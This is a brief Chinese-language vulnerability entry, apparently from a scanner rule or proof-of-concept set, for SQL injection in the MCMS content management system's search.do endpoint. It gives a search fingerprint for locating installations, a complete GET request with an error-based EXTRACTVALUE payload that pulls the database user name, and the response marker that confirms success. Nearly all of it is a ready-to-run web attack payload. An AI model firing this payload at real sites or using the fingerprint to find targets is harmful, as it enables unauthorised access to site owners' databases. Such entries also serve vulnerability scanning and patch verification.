# 铭飞CMS-SQL注入-search

铭飞CMS ｜ SQL注入 ｜ —
- **指纹**：`body="铭飞MCMS"`
- **请求**：`GET /mcms/search.do'%20AND%20EXTRACTVALUE(5225,CONCAT(0x5c,111*111,user(),0x71767a7071))%20AND%20'smmD'='smmD=1 HTTP/1.1`
- **响应特征**：500 12321